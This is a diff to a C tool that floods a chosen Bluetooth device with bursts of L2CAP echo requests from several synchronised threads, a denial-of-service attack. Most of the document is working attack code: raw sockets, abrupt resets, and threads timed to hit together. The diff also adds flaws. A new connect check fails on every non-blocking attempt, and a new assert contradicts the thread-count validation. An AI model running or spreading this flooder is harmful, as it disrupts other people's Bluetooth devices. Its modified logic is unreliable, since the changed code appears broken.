@@ -39,17 +39,27 @@
 #define SEND_BUF_SIZE 600
 #define BURST_LEN 50
 #define THREAD_SYNC_DELAY_US 5000
-#define CONNECTION_FAILED_DELAY_US 5000
 
+/* Close socket. */
 #define CLOSE_SOCKET(socket_fd) do { \
-    if ((socket_fd) != -1) { \
-        close(socket_fd); \
-        socket_fd = -1; \
-    } \
+	if ((socket_fd) != -1) { \
+		close(socket_fd); \
+		socket_fd = -1; \
+	} \
 } while (0)
 
+/* Sleep the US microseconds; usleep(3) is deprecated. */
+#define SLEEP_US(US) do { \
+	nanosleep(&(struct timespec){ \
+		.tv_sec = 0, \
+		.tv_nsec = (US) * 1000 \
+	}, NULL); \
+} while(0)
+
 /* Function prototypes */
+/* Flood attack target_baddr. */
 static void flood_ping(const char *target_baddr);
+/* Print usage manual. */
 static inline void usage(void);
 
 /* Global variables */
@@ -63,10 +73,10 @@ flood_ping(const char *target_baddr)
 	socklen_t optlen;
 	int i, socket_fd;
 	char send_buf[L2CAP_CMD_HDR_SIZE + SEND_BUF_SIZE];
-	char str[18];
+	char host_btaddr[18];
 	int fd_opts;
 
-	/* random_r(3) things. */
+	/* See random_r(3); that's for random number generator. */
 	char statebuf[8] = {0};
 	struct random_data rand_state = {0};
 	unsigned int seed = (unsigned int)time(NULL);
@@ -83,43 +93,39 @@ flood_ping(const char *target_baddr)
 	if (initstate_r(seed, statebuf, sizeof(statebuf), &rand_state) == -1) {
 		err(1, "unable to seed random number generator (initstate_r)");
 	}
-
 	/* Initialize send buffer */
 	for (i = 0; i < SEND_BUF_SIZE; i++)
 		send_buf[L2CAP_CMD_HDR_SIZE + i] = (i % 40) + 'A';
 
 	for (;;) {
-		/* Create non-blocking socket so we can control connection
-		 * attempt timeout; see below. */
+		/* Create a non-blocking socket
+		 * so we can control connection attempt timeout; see below. */
 		socket_fd = socket(PF_BLUETOOTH, SOCK_RAW|SOCK_NONBLOCK, BTPROTO_L2CAP);
-		if (socket_fd < 0)
+		if (socket_fd == -1)
 			errx(1, "Can't create socket");
-
 		/* close() calls send RST immediately instead of graceful detach. */
-		setsockopt(socket_fd, SOL_SOCKET,
-				SO_LINGER, &linger_opt, sizeof(linger_opt));
+		if (setsockopt(socket_fd, SOL_SOCKET,
+				SO_LINGER, &linger_opt, sizeof(linger_opt)) == -1)
+			errx(1, "Can't set socket options");
 		/* Don't care if Bluetooth is still processing requests. */
-		setsockopt(socket_fd, SOL_SOCKET,
-				SO_REUSEADDR, &reuse, sizeof(reuse));
+		if (setsockopt(socket_fd, SOL_SOCKET,
+				SO_REUSEADDR, &reuse, sizeof(reuse)) == -1)
+			errx(1, "Can't set socket options");
 
-		/* Bind to local address */
+		/* Bind to a local address. */
 		memset(&addr, 0, sizeof(addr));
 		addr.l2_family = AF_BLUETOOTH;
 		bacpy(&addr.l2_bdaddr, &local_baddr);
-		if (bind(socket_fd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
+		if (bind(socket_fd, (struct sockaddr *) &addr, sizeof(addr)) == -1)
 			errx(1, "Can't bind socket");
 
-		/* Connect to remote device */
+		/* Connect to the remote device. */
 		memset(&addr, 0, sizeof(addr));
 		addr.l2_family = AF_BLUETOOTH;
 		str2ba(target_baddr, &addr.l2_bdaddr);
-		/* Rather than send a request and kindly wait for it
-		 * to be served, we repeat the request if it
-		 * has not been served quickly. This increases pressure. */
 		errno = 0;
-		/* Attempt the connection and discard the return value;
-		 * rely on errno instead. */
-		connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr));
+		if (connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
+			goto connection_failed;
 		if (errno != EINPROGRESS)
 			goto connection_failed;
 
@@ -127,11 +133,11 @@ flood_ping(const char *target_baddr)
 		struct pollfd cpf = {socket_fd, POLLOUT, 0};
 		if (poll(&cpf, 1, 1500) < 1)
 			goto connection_failed;
-
-		/* Any errors? */
+		/* Check for errors. */
 		sock_err = 0;
 		sock_err_len = sizeof(sock_err);
-		getsockopt(socket_fd, SOL_SOCKET, SO_ERROR, &sock_err, &sock_err_len);
+		if (getsockopt(socket_fd, SOL_SOCKET, SO_ERROR, &sock_err, &sock_err_len) == -1)
+			goto connection_failed;
 		if (sock_err != 0)
 			goto connection_failed;
 
@@ -139,48 +145,39 @@ flood_ping(const char *target_baddr)
 		fd_opts = fcntl(socket_fd, F_GETFL, 0);
 		if (fd_opts == -1)
 			errx(1, "Can't request socket properties.");
-
 		fcntl(socket_fd, F_SETFL, fd_opts & ~O_NONBLOCK);
+
 		/* Set timeout on send() calls. */
 		setsockopt(socket_fd, SOL_SOCKET, SO_SNDTIMEO, &snd_tv, sizeof(snd_tv));
 
-		/* Get BT address of the local interface. */
+		/* Write logs. */
 		memset(&addr, 0, sizeof(addr));
 		optlen = sizeof(addr);
 		if (getsockname(socket_fd, (struct sockaddr *) &addr, &optlen) < 0)
 			errx(1, "Can't get local address");
-		ba2str(&addr.l2_bdaddr, str);
-
+		ba2str(&addr.l2_bdaddr, host_btaddr);
 		printf("Thread %2d attacks %s from %s (data size %d) ...\n",
-		       omp_get_thread_num(), target_baddr, str, SEND_BUF_SIZE);
+		       omp_get_thread_num(), target_baddr, host_btaddr, SEND_BUF_SIZE);
 
-		/* Send a lot of garbage. */
+		/* Send garbage. */
 		for (i = 0; i < BURST_LEN; i++) {
 			if (random_r(&rand_state, &randomID) == -1)
-				err(1, "unable to generate random number (random_r)");
+				err(1, "Can't random_r()");
 
 			l2cap_cmd_hdr *send_cmd = (l2cap_cmd_hdr *) send_buf;
 			send_cmd->ident = (uint8_t)randomID;
 			send_cmd->len   = htobs(SEND_BUF_SIZE);
 			send_cmd->code  = L2CAP_ECHO_REQ;
 
-			if (send(socket_fd, send_buf, L2CAP_CMD_HDR_SIZE + SEND_BUF_SIZE, 0) < 1)
-				break; /* Whatever... Try again later. */
+			if (send(socket_fd, send_buf, L2CAP_CMD_HDR_SIZE + SEND_BUF_SIZE, 0) == -1)
+				break; /* Whatever. Reconnect... */
 		}
 
-		/* Abrupt disconnect. */
-		CLOSE_SOCKET(socket_fd);
-		/* Sync threads so they attack ~simultaneously. */
-		usleep(THREAD_SYNC_DELAY_US);
-		continue;
-
 connection_failed:
-		/* Clean-up. */
 		CLOSE_SOCKET(socket_fd);
-		/* Prevent the CPU from burning
-		 * when the target is unreachable. */
-		usleep(CONNECTION_FAILED_DELAY_US);
-		continue;
+		/* Sync threads so they attack ~simultaneously
+		 * and prevent CPU burn. */
+		SLEEP_US(THREAD_SYNC_DELAY_US);
 	}
 }
 
@@ -219,6 +216,8 @@ main(int argc, char *argv[])
 		/* Number of parallel workers. */
 		case 't':
 			num_threads = atoi(optarg);
+			if (num_threads < 1)
+				err(1, "invalid number of threads");
 			break;
 		case 'v':
 			printf("%s\n", GIT_VERSION);
@@ -240,6 +239,7 @@ main(int argc, char *argv[])
 		return -1;
 	}
 
+	assert(num_threads > 1);
 #pragma omp parallel num_threads(num_threads)
 	{
 		flood_ping(argv[0]);
